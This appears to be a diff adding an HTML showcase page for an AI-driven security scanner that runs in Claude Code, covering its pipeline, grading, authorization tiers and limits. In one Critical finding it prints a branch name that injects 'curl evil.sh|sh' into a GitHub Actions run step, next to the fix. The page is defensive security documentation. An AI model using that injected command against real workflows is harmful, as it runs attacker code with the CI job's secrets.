@@ -1,0 +1,565 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>ai-sec Pipeline</title>
+<meta name="description" content="One repository, one scan, one verdict — and the list of what was not checked.">
+<style>
+/* Layout: app shell. Fixed left menu, one section on screen at a time.
+   Light by default; the toggle sets data-theme="dark". Consoles stay dark in both.
+   No webfonts: the page is self-contained and renders the same offline. */
+:root {
+  --bg: #f4f5f9;
+  --side: #ffffff;
+  --tile: #ffffff;
+  --tile-2: #f7f8fc;
+  --edge: #e2e5ef;
+  --ink: #141833;
+  --muted: #5a6082;
+  --dim: #8d92ad;
+  --accent: #3d4de0;
+  --accent-soft: #eceefe;
+  --gold: #b5832a;
+  --gold-soft: #fbf3e2;
+  --pass: #198754;
+  --fail: #c8392f;
+  --warn: #a26a00;
+  --term: #12152b;
+  --f-display: "Segoe UI", system-ui, -apple-system, sans-serif;
+  --f-body: system-ui, -apple-system, "Segoe UI", sans-serif;
+  --f-mono: ui-monospace, "Cascadia Mono", Consolas, "SF Mono", monospace;
+}
+:root[data-theme="dark"] {
+  --bg: #0c0f1d; --side: #10142a; --tile: #151a33; --tile-2: #1a1f3d; --edge: #262c52;
+  --ink: #eceefb; --muted: #a0a6c8; --dim: #6f7599; --accent: #8f97ff; --accent-soft: #232a55;
+  --gold: #e2b765; --gold-soft: #2c2716; --pass: #5ad694; --fail: #ff7b72; --warn: #f2c260;
+  --term: #090b16; color-scheme: dark;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0c0f1d; --side: #10142a; --tile: #151a33; --tile-2: #1a1f3d; --edge: #262c52;
+    --ink: #eceefb; --muted: #a0a6c8; --dim: #6f7599; --accent: #8f97ff; --accent-soft: #232a55;
+    --gold: #e2b765; --gold-soft: #2c2716; --pass: #5ad694; --fail: #ff7b72; --warn: #f2c260;
+    --term: #090b16; color-scheme: dark;
+  }
+}
+* { box-sizing: border-box; }
+[hidden] { display: none !important; }
+html, body { height: 100%; }
+body { margin: 0; background: var(--bg); color: var(--ink); font-family: var(--f-body); font-size: 15px; line-height: 1.55; }
+code { font-family: var(--f-mono); font-size: .88em; }
+p { margin: 0; }
+h1, h2, h3 { font-family: var(--f-display); margin: 0; text-wrap: balance; letter-spacing: -.015em; }
+h1 { font-size: clamp(30px, 4.4vw, 52px); font-weight: 800; line-height: 1.02; }
+h1 em { font-style: normal; color: var(--accent); }
+h2 { font-size: clamp(22px, 2.8vw, 31px); font-weight: 700; line-height: 1.12; }
+h3 { font-size: 16.5px; font-weight: 700; }
+button { font: inherit; color: inherit; cursor: pointer; }
+button:focus-visible, a:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+a { color: var(--accent); }
+
+/* shell */
+.app { display: grid; grid-template-columns: 236px minmax(0, 1fr); min-height: 100%; }
+.side { position: sticky; top: 0; height: 100vh; background: var(--side); border-right: 1px solid var(--edge);
+        display: flex; flex-direction: column; gap: 20px; padding: 24px 14px 18px; }
+.brand { display: grid; gap: 2px; padding: 0 8px; }
+.brand b { font-family: var(--f-display); font-size: 19px; font-weight: 800; letter-spacing: -.02em; }
+.brand span { font-family: var(--f-mono); font-size: 11px; color: var(--dim); }
+.nav { display: grid; gap: 3px; overflow-y: auto; }
+.nav button { display: grid; grid-template-columns: 26px 1fr; align-items: center; gap: 8px; text-align: left;
+              padding: 9px 10px; border-radius: 10px; border: 0; background: none; color: var(--muted); font-weight: 600; font-size: 14px; }
+.nav button .i { width: 26px; height: 26px; border-radius: 8px; display: grid; place-items: center;
+                 font-family: var(--f-mono); font-size: 12px; background: var(--tile-2); border: 1px solid var(--edge); }
+.nav button:hover { background: var(--tile-2); color: var(--ink); }
+.nav button[aria-current="true"] { background: var(--accent-soft); color: var(--accent); }
+.nav button[aria-current="true"] .i { background: var(--accent); color: #fff; border-color: transparent; }
+.side footer { margin-top: auto; display: grid; gap: 8px; padding: 0 8px; }
+.side footer button { border: 1px solid var(--edge); background: var(--tile-2); border-radius: 9px; padding: 7px 10px; font-size: 13px; font-weight: 600; color: var(--muted); }
+.side footer small { color: var(--dim); font-family: var(--f-mono); font-size: 10.5px; line-height: 1.5; }
+
+main { min-width: 0; padding: 44px clamp(16px, 4vw, 56px) 72px; }
+section { max-width: 1040px; margin: 0 auto; display: grid; gap: 22px; }
+.eyebrow { font-family: var(--f-mono); font-size: 11.5px; letter-spacing: .14em; text-transform: uppercase; color: var(--dim); }
+.lead { font-size: 17.5px; color: var(--muted); max-width: 68ch; }
+
+/* tiles */
+.grid { display: grid; gap: 14px; }
+.g2 { grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); }
+.g3 { grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); }
+.g4 { grid-template-columns: repeat(auto-fit, minmax(165px, 1fr)); }
+.tile { background: var(--tile); border: 1px solid var(--edge); border-radius: 14px; padding: 16px 17px; display: grid; gap: 8px; align-content: start; }
+.tile p { color: var(--muted); font-size: 14px; }
+.tile .k { font-family: var(--f-mono); font-size: 11px; color: var(--dim); letter-spacing: .08em; text-transform: uppercase; }
+.tile .big { font-family: var(--f-display); font-size: 30px; font-weight: 800; line-height: 1; letter-spacing: -.02em; }
+.tile.accent { border-color: var(--accent); background: var(--accent-soft); }
+.tile.gold { border-color: var(--gold); background: var(--gold-soft); }
+
+/* console */
+.term { background: var(--term); border-radius: 13px; padding: 15px 17px; overflow-x: auto; border: 1px solid #222848; }
+.term pre { margin: 0; font-family: var(--f-mono); font-size: 12.6px; line-height: 1.68; color: #c9cee8; white-space: pre; }
+.term .c { color: #6f7599; }
+.term .p { color: #5ad694; }
+.term .f { color: #ff7b72; }
+.term .w { color: #f2c260; }
+.term .a { color: #8f97ff; }
+.term .b { color: #eceefb; font-weight: 600; }
+
+/* flow */
+.flow { display: grid; grid-template-columns: repeat(auto-fit, minmax(128px, 1fr)); gap: 10px; }
+.step { background: var(--tile); border: 1px solid var(--edge); border-radius: 12px; padding: 13px 13px 14px; display: grid; gap: 5px; align-content: start; }
+.step b { font-size: 14.5px; }
+.step span { font-size: 12.5px; color: var(--muted); }
+.step .n { font-family: var(--f-mono); font-size: 10.5px; color: var(--dim); }
+.step.hot { border-color: var(--accent); }
+
+/* table */
+table { border-collapse: collapse; width: 100%; font-size: 14px; }
+th, td { text-align: left; padding: 9px 11px; border-bottom: 1px solid var(--edge); vertical-align: top; }
+th { font-size: 11.5px; letter-spacing: .1em; text-transform: uppercase; color: var(--dim); font-weight: 700; }
+tbody tr:last-child td { border-bottom: 0; }
+.wrap { background: var(--tile); border: 1px solid var(--edge); border-radius: 14px; overflow: hidden; }
+td code { background: var(--tile-2); padding: 1px 5px; border-radius: 5px; }
+
+.pill { display: inline-block; font-family: var(--f-mono); font-size: 11px; padding: 2px 7px; border-radius: 999px; border: 1px solid var(--edge); background: var(--tile-2); color: var(--muted); white-space: nowrap; }
+.pill.ok { color: var(--pass); border-color: color-mix(in srgb, var(--pass) 40%, transparent); }
+.pill.no { color: var(--fail); border-color: color-mix(in srgb, var(--fail) 40%, transparent); }
+.pill.mid { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 40%, transparent); }
+
+.note { border-left: 3px solid var(--gold); background: var(--gold-soft); padding: 12px 15px; border-radius: 0 11px 11px 0; font-size: 14.5px; }
+:root[data-theme="dark"] .note { color: var(--ink); }
+.kbd { font-family: var(--f-mono); font-size: 11px; border: 1px solid var(--edge); border-bottom-width: 2px; border-radius: 5px; padding: 1px 5px; background: var(--tile-2); }
+
+@media (max-width: 820px) {
+  .app { grid-template-columns: 1fr; }
+  .side { position: static; height: auto; flex-direction: column; }
+  .nav { grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); }
+  main { padding: 28px 16px 56px; }
+}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside class="side">
+    <div class="brand"><b>ai-sec</b><span>v0.18.0 · M18</span></div>
+    <nav class="nav" id="nav" aria-label="Sections"></nav>
+    <footer>
+      <button id="theme" type="button">Toggle theme</button>
+      <small>493 tests · 141/141 mutations killed · 31 built-in rules · zero runtime dependencies</small>
+    </footer>
+  </aside>
+
+  <main id="main">
+
+<!-- ───────────────────────────── 1 ───────────────────────────── -->
+<section data-title="Overview" data-icon="◆">
+  <div>
+    <p class="eyebrow">AI-driven security assessment · runs in Claude Code</p>
+    <h1>From a repository to a verdict<br><em>you can defend in a review</em></h1>
+  </div>
+  <p class="lead">
+    Seven stages take a target from <i>“what is this, and what may I touch?”</i> to a result a
+    pipeline can act on. Every number it prints is paired with what it could <b>not</b> check —
+    that pairing is the product, not the rule count.
+  </p>
+
+  <div class="grid g4">
+    <div class="tile"><span class="k">Modules</span><span class="big">14</span><p>M1–M14, from taint analysis to the OWASP LLM Top 10.</p></div>
+    <div class="tile"><span class="k">Scanners</span><span class="big">8</span><p>Two built in and need nothing installed. Six plug into one adapter protocol.</p></div>
+    <div class="tile"><span class="k">Benchmarks</span><span class="big">4</span><p>Two written by someone else. One writes its own answers.</p></div>
+    <div class="tile accent"><span class="k">Mutations killed</span><span class="big">141/141</span><p>Every gate has a test that fails when the gate is removed.</p></div>
+  </div>
+
+  <div class="note">
+    A clean report here means <b>“these scanners looked at these things and found nothing.”</b>
+    It never means “this is secure”, and the output is shaped so the two cannot be confused.
+  </div>
+</section>
+
+<!-- ───────────────────────────── 2 ───────────────────────────── -->
+<section data-title="The one property" data-icon="!">
+  <div>
+    <p class="eyebrow">Why this exists</p>
+    <h2>Never a quiet pass</h2>
+  </div>
+  <p class="lead">
+    A scanner that is missing, crashed, timed out, did not understand your language, or ran with
+    one capability unusable does not disappear into a clean result. It turns up in the coverage
+    ledger of that run and in the grade of the module that was counting on it.
+  </p>
+
+  <div class="grid g2">
+    <div class="tile">
+      <h3>The failure this prevents</h3>
+      <p>trivy against a repository with <b>no lockfile</b> exits 0 and reports zero dependency findings — because <code>package.json</code> states ranges and a range is not a version. Nothing was read. Every layer above it correctly said there was nothing.</p>
+    </div>
+    <div class="tile">
+      <h3>What happens instead</h3>
+      <p>The adapter declares a <b>partial refusal</b>. The scanner still runs — its misconfiguration and secret checks are unaffected — and the one capability it cannot use is named in the ledger and grades that module <span class="pill mid">blind</span>.</p>
+    </div>
+  </div>
+
+  <div class="term"><pre><span class="c">Could not evaluate (5)</span>
+  - <span class="b">trivy: dependency CVEs</span>: no lockfile or other resolvable manifest was found,
+    so trivy has no package versions to match against its database — <span class="w">zero dependency
+    findings here means nothing was read, not that nothing is vulnerable</span>
+  - <span class="b">builtin: unsupported-language</span>: 3 python file(s): only 2 of 31 built-in rules
+    apply to this language, so injection, XSS and crypto were not checked in them.
+  - <span class="b">module M11</span>: no scanner in this run contributes to it
+
+<span class="w">Note: this run completed, but the coverage ledger above is not empty.</span></pre></div>
+</section>
+
+<!-- ───────────────────────────── 3 ───────────────────────────── -->
+<section data-title="The flow" data-icon="→">
+  <div>
+    <p class="eyebrow">Seven stages</p>
+    <h2>discover → scope → scan → merge → verify → score → report</h2>
+  </div>
+  <p class="lead">The deterministic half is code. The AI explains and judges, and never sits in the hot loop.</p>
+
+  <div class="flow">
+    <div class="step"><span class="n">01</span><b>discover</b><span>Map the attack surface: languages, entry points, what is even here.</span></div>
+    <div class="step"><span class="n">02</span><b>scope</b><span>Tier ceiling, allowed hosts, authorization. A human edits this file.</span></div>
+    <div class="step hot"><span class="n">03</span><b>scan</b><span>Every applicable scanner runs. T0 reads files and sends nothing.</span></div>
+    <div class="step hot"><span class="n">04</span><b>merge</b><span>Findings unite by CWE family — not by the scanner's rule id.</span></div>
+    <div class="step"><span class="n">05</span><b>verify</b><span>A human records a verdict. The verifier may not be the tool that found it.</span></div>
+    <div class="step"><span class="n">06</span><b>score</b><span>Each module is graded against a benchmark with recorded answers.</span></div>
+    <div class="step"><span class="n">07</span><b>report</b><span>Verdict, findings, what is not application code, and what was not checked.</span></div>
+  </div>
+
+  <div class="grid g2">
+    <div class="tile">
+      <h3>Merge, never sum</h3>
+      <p><code>open-redirect</code> and <code>javascript.express.security.audit.express-open-redirect</code> are <b>one</b> finding with two sources. Independent corroboration is what raises confidence — not a longer list.</p>
+    </div>
+    <div class="tile">
+      <h3>One cause, not twenty symptoms</h3>
+      <p>One <code>createHash('md5')</code> reached from twenty call sites is <b>one</b> finding anchored at the cause, carrying twenty <code>occurrences</code>. Twenty findings would make the fix look twenty times bigger than it is.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ───────────────────────────── 4 ───────────────────────────── -->
+<section data-title="One real run" data-icon="▶">
+  <div>
+    <p class="eyebrow">Not a mock-up — a scan of a real repository on this machine</p>
+    <h2>Four commands, and what came back</h2>
+  </div>
+
+  <div class="term"><pre><span class="a">$</span> node bin/sec.mjs doctor
+<span class="p">[ok  ]</span> scanner:builtin        rules-31
+<span class="p">[ok  ]</span> scanner:gitleaks       <span class="c">·</span> <span class="p">[ok  ]</span> scanner:semgrep   1.183.0
+<span class="p">[ok  ]</span> scanner:trivy          0.76.1
+<span class="w">[warn]</span> scanner:nuclei         not installed — the checks it contributes will not run
+<span class="w">[warn]</span> scanner:zap            not installed — the checks it contributes will not run
+<span class="p">[ok  ]</span> tier-ceiling           T0        <span class="c">// static. sends nothing.</span>
+<span class="p">[ok  ]</span> redaction              active    <span class="c">// no secret reaches disk</span>
+
+<span class="a">$</span> node bin/sec.mjs scan ../recall
+<span class="a">$</span> node bin/sec.mjs report
+
+<span class="f">VERDICT: FAIL — 5 new finding(s) at or above High/Firm</span>
+
+  <span class="f">[Critical/Firm]</span> run-shell-injection        .sdlc/ci/github-workflow.yml:59
+  <span class="f">[Critical/Firm]</span> run-shell-injection        .sdlc/ci/github-workflow.yml:52
+  <span class="w">[High/Firm]</span>     mutable-action-tag         .sdlc/ci/github-workflow.yml:30
+  <span class="w">[High/Firm]</span>     react-unsanitized-method   .sdlc/ui/.../app.js:1317
+  <span class="w">[High/Firm]</span>     mutable-action-tag         .sdlc/ci/github-workflow.yml:33
+
+<span class="c">Notes:</span>
+  - <span class="w">17 of 17 finding(s) have not been verified by anyone</span>; sec verify records a
+    verdict, and the verifier may not be the tool that found it</pre></div>
+
+  <div class="grid g2">
+    <div class="tile">
+      <h3>What the two Critical findings are</h3>
+      <p>A GitHub Actions workflow interpolating <code>${{ github.head_ref }}</code> straight into a <code>run:</code> shell block. <code>head_ref</code> is <b>the branch name chosen by whoever opens the pull request</b>.</p>
+      <p>A fork branch named <code>a";curl evil.sh|sh;"</code> executes on the runner, with every secret that job can see.</p>
+    </div>
+    <div class="tile gold">
+      <h3>Why this one mattered more than its severity</h3>
+      <p>The file is a <b>CI template the sdlc bundle ships to every project</b>. One flaw there is one flaw replicated into every repository that adopted it — which is the difference between a finding and a finding worth paging someone about.</p>
+    </div>
+  </div>
+
+  <div class="term"><pre><span class="c"># the fix: stop interpolating, pass through the environment</span>
+<span class="f">- run: git fetch --no-tags origin "${{ github.base_ref }}"</span>
+<span class="p">+ env:</span>
+<span class="p">+   BASE_REF: ${{ github.base_ref }}</span>
+<span class="p">+ run: git fetch --no-tags origin "$BASE_REF"</span></pre></div>
+</section>
+
+<!-- ───────────────────────────── 5 ───────────────────────────── -->
+<section data-title="Two axes" data-icon="✕">
+  <div>
+    <p class="eyebrow">Reading a finding</p>
+    <h2>Severity is how bad. Confidence is how sure.</h2>
+  </div>
+  <p class="lead">
+    One number cannot carry both, and a tool that reports only severity hands you a queue you
+    cannot order. <b>High / Tentative</b> needs someone to look. <b>High / Certain</b> needs
+    someone to fix.
+  </p>
+
+  <div class="wrap">
+    <table>
+      <thead><tr><th>Confidence</th><th>Earned by</th><th>What to do with it</th></tr></thead>
+      <tbody>
+        <tr><td><span class="pill ok">Certain</span></td><td>Confirmed by reproduction, by a human who is not the tool that found it</td><td>Fix it.</td></tr>
+        <tr><td><span class="pill mid">Firm</span></td><td>Dataflow, a version match, or two independent scanners agreeing</td><td>Triage first, then fix.</td></tr>
+        <tr><td><span class="pill">Tentative</span></td><td>A single pattern match, or anything outside application code</td><td>Look before you believe it.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="grid g2">
+    <div class="tile">
+      <h3>Severity is rescored here</h3>
+      <p>Never copied from the tool. When two scanners disagree the report <b>says they disagree</b> instead of quietly picking one.</p>
+    </div>
+    <div class="tile">
+      <h3>Two things never reach the bar alone</h3>
+      <p><b>hardening</b> — a missing defence rather than a present defect. And <b>non-application code</b>: tests, fixtures, examples, generated and vendored files. Reported, counted, kept out of the verdict.</p>
+      <p>Juice Shop produced <b>188 test-suite findings against 47 application ones</b>. One list ordered by severity put seed-data passwords above the SQL injection in the login route.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ───────────────────────────── 6 ───────────────────────────── -->
+<section data-title="Grades" data-icon="#">
+  <div>
+    <p class="eyebrow">sec modules</p>
+    <h2>A rule count says nothing. A grade is a claim.</h2>
+  </div>
+  <p class="lead">Every module is graded against a benchmark with recorded answers. Quote the grade when you quote the module.</p>
+
+  <div class="wrap">
+    <table>
+      <thead><tr><th>Grade</th><th>Means</th></tr></thead>
+      <tbody>
+        <tr><td><span class="pill ok">measured</span></td><td>Full marks against a corpus <b>nobody here wrote</b>. The only grade that can surprise us.</td></tr>
+        <tr><td><span class="pill">self-measured</span></td><td>Full marks against a benchmark we wrote. The weakest evidence there is.</td></tr>
+        <tr><td><span class="pill mid">partial</span></td><td>Found some planted defects, missed others. <b>The misses are named.</b></td></tr>
+        <tr><td><span class="pill no">failing</span></td><td>An engine ran and found none of them.</td></tr>
+        <tr><td><span class="pill mid">blind</span></td><td>An engine ran with a capability this module needed unusable here. <b>A zero is not a clean result</b> — and it is deliberately not <i>failing</i>, which would blame the rules for a defect they were never shown.</td></tr>
+        <tr><td><span class="pill">unmeasured</span></td><td>Nothing has ever checked this module. <b>Not a pass.</b></td></tr>
+        <tr><td><span class="pill">no-engine</span></td><td>No scanner contributes at all, and the blind spot is written out.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="term"><pre><span class="a">$</span> node bin/sec.mjs modules       <span class="c">// against OWASP Juice Shop — 1,468 files, answers written by Juice Shop itself</span>
+
+                engines  planted  found  reported  unaccounted  grade
+  M2            2/2        0      0         1            0  <span class="w">blind</span>
+         <span class="c">blind spot: trivy could not check dependency CVEs on this target: no lockfile
+         was found … zero dependency findings means nothing was read</span>
+  M4            3/5        3      3        17            5  <span class="p">measured</span>
+  M7            3/3        5      5        24           16  <span class="p">measured</span>
+  M11           0/0        0      0         0            0  <span class="c">no-engine</span>
+         <span class="c">blind spot: business logic and abuse cases cannot be settled statically</span>
+
+<span class="b">3 partial · 1 blind · 9 measured · 1 no-engine</span></pre></div>
+
+  <div class="note">
+    The answers for Juice Shop are <b>its own</b>. It annotates every planted defect in its source
+    with <code>// vuln-code-snippet vuln-line</code>, and the benchmark re-derives the key from a
+    clone — so even the question was not ours to choose.
+  </div>
+</section>
+
+<!-- ───────────────────────────── 7 ───────────────────────────── -->
+<section data-title="Coverage" data-icon="▣">
+  <div>
+    <p class="eyebrow">Security is not one discipline</p>
+    <h2>Twelve layers covered. Twenty named and not.</h2>
+  </div>
+  <p class="lead">
+    A bundle that answers twelve well is more useful than one claiming thirty and measuring none.
+    The full inventory is <code>docs/security-coverage-map.md</code>; this is its shape.
+  </p>
+
+  <div class="grid g3">
+    <div class="tile">
+      <span class="k">Covered, graded</span>
+      <p>Secrets · injection · SCA · IaC · authn &amp; session · authorization (static) · API · client-side · crypto · database · logging · AI&nbsp;/&nbsp;LLM</p>
+    </div>
+    <div class="tile gold">
+      <span class="k">Built, blocked here</span>
+      <p><b>ZAP</b> — installer needs elevation. <b>nuclei</b> — this environment refuses to execute it. Both adapters are proved by unit tests; neither has contributed a finding to any run.</p>
+    </div>
+    <div class="tile">
+      <span class="k">Covered by nothing</span>
+      <p>SBOM &amp; provenance · cloud posture · container image &amp; runtime · mobile · network&nbsp;/&nbsp;TLS · <b>privacy &amp; PII data-flow</b> · fuzzing · threat modelling · pentest <i>(by design)</i></p>
+    </div>
+  </div>
+
+  <div class="note">
+    <b>The largest gap is not a missing rule.</b> Every project gets the same fourteen modules.
+    A mobile banking app and an internal CRUD tool are handed one identical checklist, because
+    <code>scope.json</code> decides how far a run may go and nothing decides what <i>this kind of
+    system</i> should be checked for. A project profile would make an unchecked layer a recorded
+    decision instead of an absence.
+  </div>
+</section>
+
+<!-- ───────────────────────────── 8 ───────────────────────────── -->
+<section data-title="Safety" data-icon="⛊">
+  <div>
+    <p class="eyebrow">What it refuses to do</p>
+    <h2>The one thing it never guesses is authorization</h2>
+  </div>
+
+  <div class="wrap">
+    <table>
+      <thead><tr><th>Tier</th><th>What it sends</th></tr></thead>
+      <tbody>
+        <tr><td><span class="pill ok">T0</span></td><td>Nothing. Reads files. <b>The default</b> — you do not need permission to read your own repository.</td></tr>
+        <tr><td><span class="pill">T1</span></td><td>Plain reads of known paths, as an ordinary client would. No parameters added, no path guessing.</td></tr>
+        <tr><td><span class="pill mid">T2</span></td><td>A handful of benign requests that vary a parameter. Nothing the application could read as an attack.</td></tr>
+        <tr><td><span class="pill no">T3</span></td><td>Requests the application may well read as an attack: injection probes, fuzzing.</td></tr>
+        <tr><td><span class="pill no">T4</span></td><td>Requests that may modify or destroy data.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="grid g2">
+    <div class="tile">
+      <h3>Raising the ceiling is a human editing a file</h3>
+      <p>Not a flag, not a prompt, not something an agent can talk its way into. A scan above the ceiling is refused with <b>exit 2</b> and a named gate, and the refusal says which line of which file would have to change.</p>
+    </div>
+    <div class="tile">
+      <h3>Hard limits, not preferences</h3>
+      <p>Authorized targets only — your own code, employer systems with authorization, staging, CTF, deliberately vulnerable practice apps. <b>Never a third party, never production.</b></p>
+      <p>No exploit development, no denial of service, no data destruction, no detection evasion. A finding is proved by the smallest safe evidence, never by damage.</p>
+    </div>
+  </div>
+
+  <div class="term"><pre><span class="a">$</span> node bin/sec.mjs scan https://someone-elses.example --tier T3
+<span class="f">REFUSED</span> <span class="c">G2-host-allowlist</span> — the host is not in <span class="b">.sec/default/scope.json</span> allow_hosts
+         <span class="c">and the requested tier T3 is above the ceiling T0</span>
+<span class="c">exit 2</span></pre></div>
+
+  <p class="lead">No secret is ever written to a report, a baseline, a commit or a tool argument.
+  A judgement whose reason contains a credential is refused outright.</p>
+</section>
+
+<!-- ───────────────────────────── 9 ───────────────────────────── -->
+<section data-title="Install &amp; run" data-icon="$">
+  <div>
+    <p class="eyebrow">Node 20+ and nothing else</p>
+    <h2>Day one</h2>
+  </div>
+
+  <div class="term"><pre><span class="a">$</span> node bin/sec.mjs doctor          <span class="c">// what is installed, and what each absence costs</span>
+<span class="a">$</span> node bin/sec.mjs scan .           <span class="c">// T0: static, sends nothing</span>
+<span class="a">$</span> node bin/sec.mjs report           <span class="c">// the verdict and the findings</span>
+<span class="a">$</span> node bin/sec.mjs modules          <span class="c">// is each module any good?</span>
+
+<span class="c"># once you have triaged the first run</span>
+<span class="a">$</span> node bin/sec.mjs baseline promote <span class="c">// this is the known state</span>
+<span class="a">$</span> node bin/sec.mjs scan .           <span class="c">// from now on: new · fixed · unchanged</span>
+
+<span class="c"># recording a judgement — nothing is ever deleted</span>
+<span class="a">$</span> node bin/sec.mjs judge a1b2c3 false_positive "test fixture, never deployed"
+<span class="a">$</span> node bin/sec.mjs verify a1b2c3 confirmed --by luan --via reproduction "POST /x returns 200 as anon"
+
+<span class="c"># out to anything that reads SARIF 2.1.0</span>
+<span class="a">$</span> node bin/sec.mjs export --out findings.sarif</pre></div>
+
+  <div class="wrap">
+    <table>
+      <thead><tr><th>Exit</th><th>Meaning</th><th>In CI</th></tr></thead>
+      <tbody>
+        <tr><td><code>0</code></td><td>done · PASS · WARN</td><td>green</td></tr>
+        <tr><td><code>1</code></td><td>error, or FAIL</td><td>red</td></tr>
+        <tr><td><code>2</code></td><td><b>refused</b> — a gate said no</td><td>red, and read the gate name</td></tr>
+        <tr><td><code>3</code></td><td>not evaluable — nothing produced coverage</td><td>red</td></tr>
+        <tr><td><code>4</code></td><td>degraded — something ran and something did not</td><td><b>not a pass.</b> You did not get the scan you asked for.</td></tr>
+        <tr><td><code>5</code></td><td>aborted — an auto-stop fired mid-run</td><td>red</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ───────────────────────────── 10 ───────────────────────────── -->
+<section data-title="Limits" data-icon="∅">
+  <div>
+    <p class="eyebrow">Say this part out loud to whoever asked for the report</p>
+    <h2>What this does not do</h2>
+  </div>
+
+  <div class="grid g2">
+    <div class="tile"><h3>It is not a pentest</h3><p>It writes no exploits, and the dynamic tiers have been exercised against a local benchmark — not against real infrastructure.</p></div>
+    <div class="tile"><h3>Business logic is out of reach</h3><p>M11, <span class="pill">no-engine</span>, permanently. Abuse cases, pricing flaws, workflow bypasses — the defects that cost real money — need a human who understands the intended flow.</p></div>
+    <div class="tile"><h3>It has one profile</h3><p>Every project gets the same fourteen modules. Choosing the approach per system is still yours.</p></div>
+    <div class="tile accent"><h3>Nobody outside this project has reviewed it</h3><p>That, not a missing feature, is the largest gap in its evidence. Every grade above is self-assessed against corpora — two of which we did not write, which is the strongest claim available and still not a second pair of eyes.</p></div>
+  </div>
+
+  <div class="note">
+    It is a tool for someone who can read the output. It is not a button that tells a person who
+    cannot whether they are safe.
+  </div>
+
+  <p class="lead" style="font-size:14px">
+    <span class="kbd">←</span> <span class="kbd">→</span> or <span class="kbd">j</span> <span class="kbd">k</span> move between sections ·
+    <span class="kbd">1</span>–<span class="kbd">9</span> jump · <span class="kbd">t</span> toggle theme
+  </p>
+</section>
+
+  </main>
+</div>
+
+<script>
+(() => {
+  const main = document.getElementById('main');
+  const nav = document.getElementById('nav');
+  const sections = [...main.querySelectorAll('section')];
+  let at = 0;
+
+  sections.forEach((s, i) => {
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.innerHTML = `<span class="i">${s.dataset.icon || i + 1}</span><span>${s.dataset.title}</span>`;
+    b.addEventListener('click', () => show(i));
+    nav.append(b);
+    s.hidden = i !== 0;
+  });
+
+  function show(i) {
+    at = Math.max(0, Math.min(sections.length - 1, i));
+    sections.forEach((s, n) => { s.hidden = n !== at; });
+    [...nav.children].forEach((b, n) => b.setAttribute('aria-current', String(n === at)));
+    window.scrollTo({ top: 0, behavior: 'instant' });
+    try { localStorage.setItem('ai-sec-showcase-at', String(at)); } catch {}
+  }
+
+  const root = document.documentElement;
+  function setTheme(t) {
+    root.dataset.theme = t;
+    try { localStorage.setItem('ai-sec-showcase-theme', t); } catch {}
+  }
+  document.getElementById('theme').addEventListener('click', () => {
+    setTheme(root.dataset.theme === 'dark' ? 'light' : 'dark');
+  });
+
+  addEventListener('keydown', (e) => {
+    if (e.target.matches('input, textarea')) return;
+    if (e.key === 'ArrowRight' || e.key === 'j') show(at + 1);
+    else if (e.key === 'ArrowLeft' || e.key === 'k') show(at - 1);
+    else if (e.key === 't') setTheme(root.dataset.theme === 'dark' ? 'light' : 'dark');
+    else if (/^[1-9]$/.test(e.key)) show(Number(e.key) - 1);
+  });
+
+  // Restore, defensively: a blocked or cleared store must not break the page.
+  try {
+    const t = localStorage.getItem('ai-sec-showcase-theme');
+    if (t === 'dark' || t === 'light') root.dataset.theme = t;
+    const n = Number(localStorage.getItem('ai-sec-showcase-at'));
+    show(Number.isInteger(n) ? n : 0);
+  } catch { show(0); }
+})();
+</script>
+</body>
+</html>
